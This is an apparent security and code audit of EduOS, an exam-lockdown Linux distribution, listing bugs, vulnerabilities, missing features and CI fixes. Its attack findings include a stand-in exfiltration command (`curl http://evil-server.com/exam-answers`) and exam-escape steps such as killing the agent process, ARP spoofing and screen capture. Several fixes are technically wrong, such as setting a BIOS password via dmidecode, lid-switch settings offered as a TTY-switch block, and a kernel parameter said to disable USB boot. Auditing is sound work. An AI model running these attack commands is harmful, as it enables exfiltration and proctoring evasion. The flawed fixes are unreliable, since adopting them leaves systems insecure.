# EduOS — Complete Security & Code Audit

**Auditor**: Senior Linux Systems Engineer & Security Architect  
**Date**: July 2026  
**Repo**: https://github.com/Dev9269/eduos  
**Developer**: Jainam (Dev9269)  

---

## SECTION 1: BUGS & BROKEN CODE

### P1 — Critical Bugs (Blocks Core Functionality)

#### 1.1 Password field completely ignored in API registration
**File**: `packages/eduos-server/usr/lib/edos/server/api_server.py` Lines 120-133  
**Bug**: The `register` endpoint receives a `password` field from `UserCreate` but **never stores or uses it**. The SQL INSERT only writes `username` and `role`.  
**Why it breaks**: Any user can register with any password — the password is thrown away. Login at line 108 never checks passwords either, so any password works for any user. **Authentication is entirely non-functional.**  
**Fix**:
```python
# api_server.py:120-133
import bcrypt  # add to imports

async def register(req: UserCreate):
    if not req.username or len(req.username) < 3:
        raise HTTPException(status_code=400, detail="Username must be 3+ chars")
    if not req.password or len(req.password) < 6:
        raise HTTPException(status_code=400, detail="Password must be 6+ chars")
    password_hash = bcrypt.hashpw(req.password.encode(), bcrypt.gensalt())
    try:
        user_id = db.execute(
            "INSERT INTO users (username, password_hash, role) VALUES (?, ?, ?)",
            (req.username, password_hash.decode(), req.role)
        )
        token = make_token(user_id, req.username, req.role)
        ...
```

#### 1.2 Login never verifies password
**File**: `packages/eduos-server/usr/lib/edos/server/api_server.py` Lines 106-117  
**Bug**: The login endpoint queries `SELECT * FROM users WHERE username = ?` and if the user exists, it returns a JWT. **No password comparison happens.**  
**Why it breaks**: Anyone can log in as any user by just knowing the username. Zero authentication.  
**Fix**:
```python
# api_server.py:106-117
async def login(req: LoginRequest):
    rows = db.query("SELECT * FROM users WHERE username = ?", (req.username,))
    if not rows:
        raise HTTPException(status_code=401, detail="Invalid credentials")
    row = rows[0]
    stored_hash = row.get("password_hash", "")
    if not stored_hash or not bcrypt.checkpw(req.password.encode(), stored_hash.encode()):
        raise HTTPException(status_code=401, detail="Invalid credentials")
    token = make_token(row["id"], row["username"], row["role"])
    ...
```

#### 1.3 Users table has no password_hash column
**File**: `packages/eduos-server/usr/lib/edos/server/database.py` Lines 20-27  
**Bug**: The `CREATE TABLE IF NOT EXISTS users` statement creates columns `id, username, role, active, created` — no `password_hash` column.  
**Why it breaks**: Even if the register endpoint were fixed, there's nowhere to store the password hash.  
**Fix**:
```python
# database.py:21-27
cursor.executescript("""
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL DEFAULT '',
        role TEXT DEFAULT 'student',
        active INTEGER DEFAULT 1,
        created TEXT DEFAULT CURRENT_TIMESTAMP
    );
    ...
""")
```

#### 1.4 All four system daemons hardcode non-existent URLs
**File**: `packages/eduos-services/usr/lib/edos/services/exam-daemon.py` Line 7 — `https://exam.edos.edu/api/status`  
**File**: `packages/eduos-services/usr/lib/edos/services/sync-daemon.py` Line 7 — `https://sync.edos.edu/api/poll`  
**File**: `packages/eduos-services/usr/lib/edos/services/update-daemon.py` Line 7 — `https://update.edos.edu/api/check`  
**Bug**: These domains do not exist. All daemons will fail on every poll cycle (every 30-60 seconds), catch the exception silently, and log errors.  
**Why it breaks**: These daemons are **dead code running in production**. They consume CPU, fill logs, and provide zero value. A student can trivially DNS-spoof `*.edos.edu` to point to their own server.  
**Fix** — make URLs configurable:
```python
# exam-daemon.py:7
SERVER_CONFIG = "/etc/edos/server.conf"
def get_server_url():
    import configparser
    config = configparser.ConfigParser()
    config.read(SERVER_CONFIG)
    return config.get("server", "url", fallback="http://10.0.2.1:8000")

EXAM_STATUS_URL = f"{get_server_url()}/api/exam/status"
```

#### 1.5 ExamLockdown.activate() does literally nothing
**File**: `packages/eduos-exam/usr/lib/edos/apps/exam/exam_lockdown.py` Lines 11-13  
**Bug**: `activate()` just sets `self.active = True`. No iptables rules are applied, no browsers are killed, no TTYs are blocked, no USB is disabled, no `/proc` restrictions are set.  
**Why it breaks**: The entire "lockdown" feature is a boolean flag. A student can press Ctrl+Alt+F3 to switch to a TTY, run `killall python3`, and escape the exam entirely.  
**Fix** — implement actual Linux lockdown:
```python
# exam_lockdown.py
import os, signal, subprocess

class ExamLockdown:
    def activate(self):
        self.active = True
        # Kill all browser/terminal processes
        for proc in ["firefox", "chrome", "chromium", "konsole", "gnome-terminal", "xterm"]:
            subprocess.run(["pkill", "-9", proc], capture_output=True)
        # Block outbound network (except to exam server)
        subprocess.run(["iptables", "-A", "OUTPUT", "-d", self.server_ip, "-j", "ACCEPT"], capture_output=True)
        subprocess.run(["iptables", "-A", "OUTPUT", "-p", "tcp", "--dport", "53", "-j", "ACCEPT"], capture_output=True)  # DNS
        subprocess.run(["iptables", "-A", "OUTPUT", "-j", "DROP"], capture_output=True)
        # Disable TTY switching
        subprocess.run(["systemctl", "stop", "getty@tty1", "getty@tty2", "getty@tty3", "getty@tty4"], capture_output=True)
        # Disable Ctrl+Alt+Fx
        with open("/etc/systemd/logind.conf", "a") as f:
            f.write("HandleLidSwitch=ignore\nHandleLidSwitchExternalPower=ignore\n")
        subprocess.run(["systemctl", "restart", "systemd-logind"], capture_output=True)
    
    def deactivate(self):
        self.active = False
        subprocess.run(["iptables", "-F", "OUTPUT"], capture_output=True)
        subprocess.run(["iptables", "-P", "OUTPUT", "ACCEPT"], capture_output=True)
```

#### 1.6 PyQt5 imported in `__main__.py` but rest of codebase uses PyQt6
**File**: `packages/eduos-exam/usr/lib/edos/apps/exam/__main__.py` Line 9  
**Bug**: Line 9 says `from PyQt5.QtWidgets import ...` but every other file (exam_app.py, exam_admin.py, eduos_admin.py, etc.) uses `PyQt6`. On a system with only PyQt6, this import crashes immediately.  
**Fix**: Change to PyQt6:
```python
# __main__.py:9
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, ...
)
from PyQt6.QtCore import Qt, QTimer, pyqtSignal
from PyQt6.QtGui import QKeySequence
```
Also change `QMessageBox.Yes` → `QMessageBox.StandardButton.Yes`, `QMessageBox.No` → `QMessageBox.StandardButton.No`, `app.exec_()` → `app.exec()`.

#### 1.7 Hardcoded encryption key in 3 files
**File**: `ExamMode/exam_app.py` Line 648 — `"eduos-exam-default-key"`  
**File**: `ExamMode/exam_admin.py` Line 90 — `"eduos-exam-default-key"`  
**File**: `ExamMode/demo_exam_config.py` Line 8 — `"EDUOS2026"`  
**Bug**: The Fernet encryption key is hardcoded as a string literal. The salt is prepended to the ciphertext. Anyone with access to the source code (all students have it) can decrypt all exam results.  
**Fix**: Use per-exam key from server, never hardcode:
```python
# exam_app.py:553-570
def _encrypt_and_save(self, answers: dict):
    # Fetch encryption key from server using auth token
    password = self._fetch_exam_key_from_server()
    if not password:
        password = os.urandom(32).hex()  # fallback: random key, store alongside
    fernet, salt = get_fernet_from_password(password)
    ...
```

### P2 — High Severity Bugs

#### 1.8 Security key dialog accepts any input, never validates
**File**: `ExamMode/exam_app.py` Lines 721-731  
**Bug**: The `SecurityKeyDialog` collects a key, name, and ID. After acceptance, the key is hashed with SHA256 at line 730 but **never validated against any server or local store**.  
**Why it breaks**: Any student can type anything in the key field and start the exam. The "security key" feature provides zero security.

#### 1.9 Autosave filename collision
**File**: `ExamMode/exam_app.py` Line 504  
**Bug**: Autosave writes to `autosave_{student_id}.json`. If two students have the same ID, their autosaves collide.  
**Fix**:
```python
# exam_app.py:504
backup_path = EXAM_DATA_DIR / f"autosave_{self.credentials['student_id']}_{int(time.time())}.json"
```

#### 1.10 No exam ID in saved filenames
**File**: `ExamMode/exam_app.py` Line 567  
**Bug**: Result files are named `{student_id}_{timestamp}.enc` with no exam ID. If a student takes multiple exams, results from different exams overwrite each other.  
**Fix**:
```python
# exam_app.py:567
filename = f"{self.credentials['student_id']}_{self.exam_config.get('id', 'unknown')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.enc"
```

#### 1.11 CodingEngine always uses Python regardless of set_language()
**File**: `packages/eduos-exam/usr/lib/edos/apps/exam/coding_engine.py` Lines 12-27  
**Bug**: `set_language()` sets `self.language` but is never called from `__main__.py` line 463. `run_code()` always calls `[self.language, fpath]` where `self.language = "python3"` (set in constructor). All coding questions run as Python regardless of their language.  
**Fix**: In `__main__.py`, pass the language from question config:
```python
# __main__.py:462-463
q_lang = q.get("language", "python3")
self.coding_engine.set_language(q_lang)
result = self.coding_engine.run_code(given)
```

#### 1.12 Anti-cheat filter allows clipboard in QTextEdit
**File**: `ExamMode/demo_exam_app.py` Lines 1368-1377  
**Bug**: The event filter allows `Ctrl+C/V/X/A` if `isinstance(obj, QTextEdit)`. The coding section editor IS a QTextEdit, so students can paste pre-written code into the exam.  
**Fix**:
```python
# demo_exam_app.py:1369
if isinstance(obj, QTextEdit) and hasattr(obj, 'allow_clipboard') and obj.allow_clipboard:
    return super().eventFilter(obj, event)
```
Then set `self.code_editor.allow_clipboard = True` only in the coding widget.

#### 1.13 Process detection uses `pgrep -x` (exact match)
**File**: `packages/eduos-exam/usr/lib/edos/apps/exam/exam_lockdown.py` Lines 78-84  
**Bug**: `pgrep -x firefox` only matches process named exactly `firefox`. Firefox runs as `/usr/lib/firefox/firefox`, so it won't match. A student can rename any binary to bypass detection.  
**Fix**:
```python
# exam_lockdown.py:78-84
def _find_processes(self, names):
    for name in names:
        result = subprocess.run(
            ["pgrep", "-f", name], capture_output=True, timeout=5
        )
        if result.returncode == 0:
            return True
    return False
```

### P3 — Medium Severity Bugs

#### 1.14 `signal.SIG_DFL` used incorrectly (value 0)
**File**: `ExamMode/demo_exam_app.py` Line 1407  
**Bug**: `signal.SIG_DFL` is integer `0`, not a callable. This resets SIGINT to default behavior but the correct value to restore the Python handler is `signal.default_int_handler`.  
**Fix**: `signal.signal(signal.SIGINT, signal.default_int_handler)`

#### 1.15 Exit warning lies about autosave
**File**: `ExamMode/demo_exam_app.py` Lines 1315-1327  
**Bug**: The message "Your progress has been auto-saved" is shown unconditionally, even if no auto-save has occurred yet. If a student logs in and immediately hits Escape, they see a claim that data was saved when it wasn't.

#### 1.16 No recovery from failed exam config load
**File**: `packages/eduos-exam/usr/lib/edos/apps/exam/__main__.py` Lines 219-225  
**Bug**: If `_fetch_exam()` fails, it falls back to a hardcoded practice exam. The fallback exam has `id=0` which is sent to the server as a valid submission, corrupting the database.

#### 1.17 Server `/api/sync` is a stub
**File**: `packages/eduos-server/usr/lib/edos/server/api_server.py` Lines 215-217  
**Bug**: `POST /api/sync` returns `{"status": "synced"}` without actually syncing anything. No data is exchanged. The sync daemon polls this endpoint every 60 seconds for zero benefit.

---

## SECTION 2: SECURITY VULNERABILITIES

### 2.1 Exam Mode Security

#### V1. Agent process can be killed by any student — CRITICAL
**Attack**: Student opens a terminal (Ctrl+Alt+F3 → login → `killall python3` or `pkill -f edos`). The exam agent dies silently. The student now has unrestricted access.  
**Current state**: `ExamLockdown` is a boolean flag. No process protection.  
**Fix**: 
1. Create a systemd service with `Restart=always` and `RestartSec=1`:
```ini
[Unit]
Description=EduOS Exam Agent
After=network.target

[Service]
ExecStart=/usr/bin/python3 /usr/lib/edos/services/exam-daemon.py
Restart=always
RestartSec=1
User=root
ProtectKernelModules=yes
SystemCallFilter=@system-service

[Install]
WantedBy=multi-user.target
```
2. Add a kernel watchdog:
```bash
echo "edos-exam - root -" > /etc/security/limits.d/edos.conf
```
3. Use `prctl()` in the Python agent to set itself as a subreaper.

#### V2. USB boot bypass — CRITICAL
**Attack**: Student inserts a USB drive, reboots, presses F12 to enter BIOS, and boots from USB. The exam lockdown never starts.  
**Current state**: No BIOS password protection, no USB blacklisting, no Secure Boot enforcement.  
**Fix**: 
1. Set BIOS password via `sudo dmidecode` (requires hardware support)
2. Disable USB boot in kernel params: `quiet splash console=tty1 usbcore.autosuspend=-1`
3. Add udev rule to disable USB storage during exam:
```bash
# /etc/udev/rules.d/99-exam-lockdown.rules
ACTION=="add", SUBSYSTEM=="usb", ATTR{authorized}="0"
```
4. Lock GRUB with password:
```bash
grub-mkpasswd-pbkdf2
# Add to /etc/grub.d/40_custom:
# set superusers="admin"
# password_pbkdf2 admin <hash>
```

#### V3. TTY escape — CRITICAL
**Attack**: During an exam, student presses Ctrl+Alt+F3 to switch to TTY3, logs in, and has full shell access. The PyQt6 exam app cannot block this because TTY switching happens at the kernel level.  
**Current state**: No TTY blocking. `ExamLockdown` has zero code for this.  
**Fix**:
```python
# exam_lockdown.py - activate()
def _disable_ttys(self):
    subprocess.run(["systemctl", "stop"] + 
        [f"getty@tty{i}" for i in range(1, 7)], capture_output=True)
    subprocess.run(["systemctl", "mask"] + 
        [f"getty@tty{i}" for i in range(1, 7)], capture_output=True)
    # Also block via logind.conf
    with open("/etc/systemd/logind.conf", "w") as f:
        f.write("[Login]\nNAutoVTs=0\nReserveVT=0\n")
    subprocess.run(["systemctl", "restart", "systemd-logind"], capture_output=True)
```

#### V4. Screen capture not blocked — HIGH
**Attack**: Student presses Print Screen or uses `spectacle`, `flameshot`, or `import` (ImageMagick) to capture the exam screen. On X11, any process can capture any window.  
**Current state**: `demo_exam_app.py` blocks the Print Screen key in the Qt event filter at line 1390, but this is trivially bypassed: `scrot -d 1` or `import -window root screenshot.png` from another TTY.  
**Fix**:
```python
# exam_lockdown.py
def _block_screen_capture(self):
    # Kill screenshot tools
    subprocess.run(["pkill", "-9", "spectacle", "flameshot", "gnome-screenshot", "scrot"], capture_output=True)
    # Block import (ImageMagick)
    os.chmod("/usr/bin/import", 0o000)  # remove execute perms
```

#### V5. Clipboard not cleared — HIGH
**Attack**: Student copies exam content, opens another app, and pastes. The PyQt6 clipboard persists.  
**Fix**:
```python
from PyQt6.QtGui import QClipboard
QApplication.clipboard().clear()
```

#### V6. Network not isolated during exams — CRITICAL
**Attack**: Student runs `curl http://evil-server.com/exam-answers` during an exam and exfiltrates questions or receives answers.  
**Current state**: No firewall rules.  
**Fix**: Add iptables lockdown in `ExamLockdown.activate()` (see Section 1.5 fix).

#### V7. Submissions not encrypted in transit — HIGH
**Attack**: Student runs `tcpdump -A port 8000` or uses ARP spoofing to intercept submissions on the LAN. The FastAPI server uses plain HTTP (not HTTPS) on port 8000.  
**Current state**: No TLS. All traffic is plaintext.  
**Fix**: Add TLS to uvicorn:
```python
# __main__.py
uvicorn.run("api_server:app", host=host, port=port, ssl_keyfile="/etc/edos/ssl/key.pem", ssl_certfile="/etc/edos/ssl/cert.pem")
```
Or run behind nginx reverse proxy with Let's Encrypt.

### 2.2 Agent Security

#### V8. No watchdog for agent process — HIGH
**Attack**: Student kills the agent with `pkill -f exam-daemon`. No alarm fires, no restart occurs, admin never knows.  
**Current state**: The systemd service has `Restart=on-failure` (not `always`). If the daemon exits with code 0 (clean exit), systemd won't restart it.  
**Fix**: Change to `Restart=always` in all .service files.

#### V9. Agent-server communication is unauthenticated — CRITICAL
**Attack**: Any device on the LAN can make requests to the FastAPI server. There's no agent authentication token, no TLS client certificates, no MAC-based validation.  
**Current state**: The `/api/sync` endpoint requires no auth. A student can POST fake data directly.  
**Fix**: Add API key authentication for agents:
```python
# api_server.py
AGENT_API_KEY = os.environ.get("EDOS_AGENT_KEY", "")

@app.middleware("http")
async def authenticate_agent(request, call_next):
    if request.url.path.startswith("/api/agent/"):
        api_key = request.headers.get("X-EDOS-API-Key", "")
        if api_key != AGENT_API_KEY:
            return JSONResponse(status_code=403, content={"detail": "Invalid API key"})
    return await call_next(request)
```

#### V10. Student can impersonate admin — CRITICAL
**Attack**: With no RBAC enforcement, a student who sends `POST /api/auth/register {"username": "admin", "role": "admin"}` creates an admin account with no password (see Bug 1.1).  
**Fix**: Restrict registration to admin-only:
```python
# api_server.py
@app.post("/api/auth/register")
async def register(req: UserCreate, authorization: str = Header(default="")):
    user = get_user_from_header(authorization)
    if user.get("role") != "admin":
        raise HTTPException(status_code=403, detail="Only admins can create users")
    ...
```

### 2.3 Admin Panel Security

#### V11. Admin config stored in plaintext JSON — HIGH
**File**: `AdminCenter/eduos_admin.py` Lines 65-79  
**Attack**: Any process on the admin laptop can read `~/.eduos/admin_config.json` which contains IP addresses of all lab machines.  
**Fix**: Encrypt the config or restrict permissions: `os.chmod(config_path, 0o600)`.

#### V12. Admin panel has no authentication — CRITICAL
**Attack**: The admin PyQt6 app has no login screen. Anyone who launches it has full control.  
**Fix**: Add a password prompt on startup:
```python
# eduos_admin.py:main()
password, ok = QInputDialog.getText(None, "Admin Auth", "Enter admin password:", QLineEdit.EchoMode.Password)
if not ok or password != get_admin_password():
    sys.exit(1)
```

### 2.4 Data Security

#### V13. SQLite database not encrypted — HIGH
**File**: `packages/eduos-server/usr/lib/edos/server/database.py` Line 14  
**Attack**: Anyone with filesystem access to the server reads all user data, exam questions, and submissions.  
**Fix**: Use SQLCipher or encrypt sensitive columns:
```python
# database.py
from pysqlcipher3 import dbapi2 as sqlite3
self.conn = sqlite3.connect(self.db_path)
self.conn.execute(f"PRAGMA key='{DB_ENCRYPTION_KEY}'")
```

#### V14. Exam questions stored as plaintext JSON in SQLite — HIGH
**File**: `packages/eduos-server/usr/lib/edos/server/api_server.py` Lines 176-182  
**Attack**: Anyone with DB access reads all exam questions and answers.  
**Fix**: Encrypt the `questions` column using per-exam key derived from exam ID + server secret.

### 2.5 Network Security

#### V15. No WebSocket implementation — CRITICAL
**Project claims**: "WebSocket communication between admin panel, server, and agents"  
**Reality**: Zero WebSocket code. All communication is HTTP polling. No real-time monitoring exists.

#### V16. No rate limiting on server — MEDIUM
**Attack**: A student can write a script that calls `POST /api/auth/login` 10,000 times per second, exhausting server resources.  
**Fix**:
```python
# api_server.py
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(429, _rate_limit_exceeded_handler)

@app.post("/api/auth/login")
@limiter.limit("5/minute")
async def login(req: LoginRequest):
    ...
```

#### V17. No HTTPS/WSS — HIGH
All traffic is unencrypted HTTP on port 8000. No TLS anywhere.

### 2.6 ISO Build Security

#### V18. No update signature verification — CRITICAL
**Attack**: A student sets up a fake update server, pushes a malicious .deb, and gains root on all lab machines. There's no GPG signature verification on updates.  
**Fix**: Sign packages with GPG and verify before install:
```python
# update-daemon.py
import gnupg
gpg = gnupg.GPG()
with open("/tmp/update.deb", "rb") as f:
    verified = gpg.verify_file(f, "/etc/edos/update-key.pub")
if not verified.trust_level:
    syslog.syslog(syslog.LOG_ERR, "Update signature verification failed")
    return
```

#### V19. ISO build has no integrity check
**File**: `.github/workflows/build-iso.yml` Lines 73-77  
**Bug**: The ISO is uploaded as a build artifact with no checksum verification.  
**Fix**: Add SHA256 checksum generation:
```yaml
- name: Generate checksum
  run: sha256sum eduos.iso > eduos.iso.sha256
- name: Upload ISO + checksum
  uses: actions/upload-artifact@v4
  with:
    name: eduos-iso
    path: |
      eduos.iso
      eduos.iso.sha256
```

---

## SECTION 3: MISSING FEATURES

### M1. Student Authentication System — CRITICAL
**Module**: ExamMode  
**Status**: Missing entirely  
**Why critical**: Currently anyone who launches the exam app can take any exam. No student login, no institutional SSO.  
**Approach**: 
- Build a simple token-based auth: server issues a 6-digit one-time code per student
- Student enters code in exam app → app authenticates against server
- Server sends exam config only after auth success
- Store student-exam mapping in SQLite

### M2. Exam Session Crash Recovery — CRITICAL
**Module**: ExamMode  
**Status**: Missing entirely  
**Why critical**: If the exam app or student PC crashes mid-exam, all progress is lost. The current autosave writes to a file but there's no mechanism to resume.  
**Approach**:
- Autosave every 15 seconds (not 30) to a JSON file with exam state
- On app restart, check for incomplete autosave → offer to resume
- Server-side: store periodic heartbeat + answer snapshots

### M3. Mid-Exam Student Reconnection — CRITICAL
**Module**: ExamMode + Server  
**Status**: Missing entirely  
**Why critical**: Student loses Wi-Fi for 30 seconds, exam app disconnects from server. Currently there's no reconnection logic.  
**Approach**:
- Implement WebSocket with auto-reconnect (exponential backoff)
- Server stores partial answers per student-exam session
- On reconnect, server sends missed answers and remaining time

### M4. Plagiarism Detection for Code — HIGH
**Module**: ExamMode  
**Status**: Missing entirely  
**Why critical**: With 60+ students in a lab, manual code review for plagiarism is impossible.  
**Approach**:
- Use `difflib.SequenceMatcher` ratio for pairwise code comparison
- Flag submissions with similarity > 80%
- Simple MOSS-like implementation:

```python
import difflib
def check_plagiarism(submissions: list) -> list:
    flags = []
    for i, a in enumerate(submissions):
        for j, b in enumerate(submissions):
            if i >= j: continue
            ratio = difflib.SequenceMatcher(None, a["code"], b["code"]).ratio()
            if ratio > 0.8:
                flags.append({"student1": a["student_id"], "student2": b["student_id"], "similarity": ratio})
    return flags
```

### M5. Faculty Real-Time Monitoring Dashboard — HIGH
**Module**: AdminCenter / Server  
**Status**: Missing entirely  
**Why critical**: Faculty has zero visibility into exams. They cannot see who is logged in, which questions are being answered, or if a student is stuck.  
**Approach**:
- Build a Flask/FastAPI web dashboard showing:
  - Live student list with status (idle/answering Q3/submitted)
  - Per-question progress bars
  - "Student disconnected" alerts
  - Time remaining per student
- Use Server-Sent Events (SSE) or WebSocket for real-time updates

### M6. Feedback System — MEDIUM
**Module**: EduOS Desktop  
**Status**: Missing entirely  
**Why critical**: No way for students to report issues or faculty to collect course feedback.  
**Approach**:
- Simple PyQt6 feedback dialog: "Rate this lab 1-5" + optional text
- Submitted to server via HTTP POST
- Display in admin dashboard

### M7. Lab Environment Snapshots — HIGH
**Module**: CyberLab  
**Status**: Missing entirely  
**Why critical**: CyberLab containers accumulate changes between student sessions. Student A leaves a backdoor, Student B "discovers" it and gets credit.  
**Approach**:
- Before each lab session, snapshot the Docker container
- On session end, destroy the container
- Use `docker commit` for persistent snapshots if needed

### M8. Admin Audit Logging — HIGH
**Module**: Server  
**Status**: Missing entirely  
**Why critical**: No record of who did what. If an admin accidentally locks all lab machines, there's no traceability.  
**Approach**:
```python
# api_server.py
@app.middleware("http")
async def log_admin_actions(request, call_next):
    if request.method in ("POST", "PUT", "DELETE"):
        user = get_user_from_header(request.headers.get("Authorization", ""))
        db.execute("INSERT INTO audit_log (user_id, action, ip, timestamp) VALUES (?, ?, ?, ?)",
                   (user.get("sub"), f"{request.method} {request.url.path}", request.client.host, datetime.utcnow().isoformat()))
    return await call_next(request)
```

### M9. Update Rollback Mechanism — HIGH
**Module**: eduos-update  
**Status**: Missing entirely  
**Why critical**: A bad update could brick 200 lab machines simultaneously. No rollback = disaster.  
**Approach**:
- Before installing updates, snapshot current package state: `dpkg --get-selections > /var/backups/eduos-packages.txt`
- Save previous .deb files in `/var/cache/eduos/rollback/`
- Rollback command: `dpkg --clear-selections; dpkg --set-selections < /var/backups/eduos-packages.txt; apt-get dselect-upgrade`

### M10. MAC-Based Admin Device Authentication — MEDIUM
**Module**: Server  
**Status**: Missing entirely  
**Why critical**: Any laptop on the LAN can connect to the admin panel server. MAC binding adds basic physical-layer security.  
**Approach**:
```python
ALLOWED_ADMIN_MACS = ["AA:BB:CC:DD:EE:FF", "11:22:33:44:55:66"]

@app.middleware("http")
async def check_admin_mac(request, call_next):
    if "/api/admin/" in request.url.path:
        mac = get_peer_mac(request.client.host)  # requires ARP table lookup
        if mac not in ALLOWED_ADMIN_MACS:
            return JSONResponse(status_code=403, content={"detail": "Unauthorized device"})
    return await call_next(request)
```

### M11. Offline Fallback — CRITICAL
**Module**: All  
**Status**: Missing entirely  
**Why critical**: The project is designed for offline campus LAN, but if the server gaming laptop crashes mid-exam, all 200 student PCs are dead.  
**Approach**:
- Local SQLite cache on each client (last known exam config, answers)
- If server unreachable > 30 seconds, switch to offline mode
- Queue submissions locally, sync when server comes back
- Election protocol: if primary server is down, a backup admin laptop takes over

---

## SECTION 4: CODE QUALITY ISSUES

### Q1. Bare except blocks everywhere
**Files**: Nearly every Python file  
**Examples**:  
- `exam_app.py:509` — `except Exception: pass`  
- `demo_exam_app.py:290` — `except Exception: pass`  
- `eduos_admin.py:72` — `except Exception: self.lab_hosts = []`  
- `exam_lockdown.py:85` — `except Exception: return False`  
**Fix**: Never use bare `except Exception: pass`. Always log:  
```python
import logging
logger = logging.getLogger(__name__)
try:
    ...
except Exception as e:
    logger.error(f"Failed to X: {e}", exc_info=True)
```

### Q2. Unused imports
- `exam_admin.py:20` — imports `QColor, QPalette` from PyQt6 but never uses them  
- `exam_app.py:26` — imports `QPixmap, QShortcut` but never uses them  
- `exam_lockdown.py:2` — imports `sys` but never uses it  
- `coding_engine.py:3` — imports `os` but only used in one place  

### Q3. Missing input validation on all API endpoints
**File**: `api_server.py` Lines 42-70  
**Fix**:
```python
class UserCreate(BaseModel):
    username: str = Field(..., min_length=3, max_length=64, pattern=r'^[a-zA-Z0-9_]+$')
    password: str = Field(..., min_length=6, max_length=128)
    role: str = Field(default="student", pattern=r'^(student|faculty|admin)$')
```

### Q4. Functions > 100 lines that need splitting
- `demo_exam_app.py:MCQSectionWidget._setup_ui()` — lines 481-589 (108 lines)  
- `demo_exam_app.py:CodingSectionWidget._setup_ui()` — lines 690-792 (102 lines)  
- `eduos_admin.py:_get_realtime_stats()` — lines 152-214 (62 lines, does 6 different things)  

### Q5. No docstrings on critical functions
- `api_server.py:make_token()` — no docstring  
- `exam_lockdown.py:activate()` — no docstring, name is misleading (doesn't actually activate anything)  
- `database.py:query()` — no docstring  

### Q6. Race conditions
- `eduos_admin.py:316-326` — `ping_results` dict modified from multiple threads without lock. The `_ping_lock` exists in `__init__` (line 59) but is never used in `_ping_all_hosts`.  
- `exam_app.py:_save_answers_backup()` — writes to file without file locking. If two autosave timers fire simultaneously (e.g., on slow I/O), the file corrupts.

### Q7. Memory leaks
- `demo_exam_app.py` — `MCQSectionWidget` creates a `QTimer` at line 583 and never stops it if `_submit_mcq()` is never called (e.g., user kills process). The timer holds a reference to `self`, preventing garbage collection.  
- `eduos_admin.py` — `PingThread` objects created at line 330 but never cleaned up. If `_ping_all_hosts()` is called repeatedly, thread objects accumulate.

### Q8. Design system duplication
**Files**: `design_system.py` (root), `EcosystemDashboard/design_system.py`  
**Bug**: The design system is duplicated across at least 2 locations. Changes to one don't propagate to the other.

---

## SECTION 5: CI/CD PIPELINE AUDIT

### 5.1 Build ISO Pipeline (`build-iso.yml`)

**Missing features**:
1. **No test stage** — The ISO is built without any tests running first. A broken commit can produce a broken ISO.
2. **No deboostrap caching** — `debootstrap` downloads the entire Debian base on every run. Without caching, a build takes 30+ minutes.
3. **No ISO verification** — No checksum, no VM boot test, no partition layout validation.
4. **No `debsums` verification** — Installed packages are not verified for integrity.
5. **No secret handling** — The chroot password is hardcoded: `echo 'root:root' | chpasswd` (line 40). Anyone who reads the workflow knows the root password of every deployed system.
6. **No version tagging** — The ISO filename is always `eduos.iso` with no version number.
7. **No release management** — No GitHub Releases, no changelog in the workflow.

### 5.2 CI Pipeline (`ci.yml`)

**Missing features**:
1. **No actual tests exist** — The `tests/` directory doesn't exist. The condition `if (Test-Path tests/)` will always be false, and the pipeline always passes with `exit 0`.
2. **PowerShell shell on Ubuntu** — The workflow uses `shell: pwsh` which requires installing PowerShell on the Ubuntu runner. This is non-standard and fragile.
3. **No linting** — No `ruff`, `pyflakes`, `mypy`, or `black` checks.
4. **No type checking** — No `mypy` or `pyright` step.

### 5.3 Fixes

```yaml
# ci.yml — add linting + type checking
- name: Lint
  run: |
    pip install ruff mypy
    ruff check .
    mypy --strict AdminCenter/ ExamMode/ packages/eduos-server/
- name: Run tests
  run: |
    pip install pytest pytest-cov
    pytest --cov=. --cov-report=term-missing
```

```yaml
# build-iso.yml — add caching + verification
- name: Cache debootstrap
  uses: actions/cache@v4
  with:
    path: ./chroot
    key: ${{ runner.os }}-debootstrap-${{ hashFiles('packages/**') }}
- name: Verify ISO
  run: |
    file eduos.iso | grep -q "ISO 9660"
    sha256sum eduos.iso > eduos.iso.sha256
- name: Create Release
  uses: softprops/action-gh-release@v2
  with:
    files: |
      eduos.iso
      eduos.iso.sha256
```

---

## SECTION 6: PRIORITY FIX ORDER

### P1 — Fix Immediately (Blocks Everything)

| # | Issue | Effort | Why |
|---|-------|--------|-----|
| 1 | **Password auth is broken** (1.1, 1.2, 1.3) | 2h | No authentication = anyone can do anything. The system has zero access control. |
| 2 | **ExamLockdown is a no-op** (1.5, V1-V7) | 4h | Students can trivially escape exams. The core exam feature doesn't work. |
| 3 | **No agent watchdog** (V8) | 1h | Students can kill the agent and bypass all monitoring. |
| 4 | **No WebSocket implementation** (M5, V15) | 8h | Real-time monitoring and exam control doesn't exist. The architecture claims it but code doesn't. |
| 5 | **Hardcoded URLs in daemons** (1.4) | 1h | Daemons are dead code. Also, DNS spoofing attack vector. |
| 6 | **Daemons use non-existent domains** (1.4) | 0.5h | All four system services are in crash loops. |
| 7 | **PyQt5 vs PyQt6 mismatch** (1.6) | 1h | Exam app doesn't start on PyQt6 systems. |
| 8 | **No student auth for exams** (1.8, M1) | 3h | Any student can take any exam. |

### P2 — Fix Before Production Deployment

| # | Issue | Effort | Why |
|---|-------|--------|-----|
| 9 | **Submissions sent over plain HTTP** (V7) | 2h | ARP spoofing → intercepted exam answers. |
| 10 | **No TLS anywhere** (V17) | 2h | All traffic is plaintext on LAN. |
| 11 | **No rate limiting** (V16) | 1h | Server can be DoS'd by a student script. |
| 12 | **No RBAC enforcement** (V10) | 2h | Students can create admin accounts. |
| 13 | **No agent-server auth** (V9) | 2h | Any device on LAN can talk to the server. |
| 14 | **No update signature verification** (V18) | 3h | Fake update server → root compromise on all machines. |
| 15 | **No offline fallback** (M11) | 4h | Single server failure = all 200 student PCs dead. |
| 16 | **No exam session crash recovery** (M2) | 4h | PC crash mid-exam = all answers lost. |

### P3 — Important

| # | Issue | Effort |
|---|-------|--------|
| 17 | Exit warning lies about autosave (1.15) | 0.5h |
| 18 | CodingEngine always uses Python (1.11) | 0.5h |
| 19 | Process detection uses `pgrep -x` (1.13) | 0.5h |
